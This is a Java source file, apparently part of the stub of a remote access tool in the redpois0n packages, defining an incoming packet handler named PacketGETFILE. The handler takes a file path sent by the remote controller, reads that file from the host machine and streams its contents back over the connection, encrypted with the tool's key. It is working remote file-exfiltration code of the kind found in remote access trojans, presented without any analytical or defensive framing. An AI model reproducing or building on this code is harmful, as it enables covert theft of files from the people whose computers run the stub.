package com.redpois0n.stub.packets.incoming;

import java.io.File;

import com.redpois0n.Connection;
import com.redpois0n.Main;
import com.redpois0n.common.io.FileIO;
import com.redpois0n.stub.packets.outgoing.Packet29SendFile;

public class PacketGETFILE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29SendFile(file.getName(), file.getAbsolutePath()));

			FileIO.writeFile(file, Connection.dos, null, Main.getKey());

			Connection.lock();
		}
	}

}
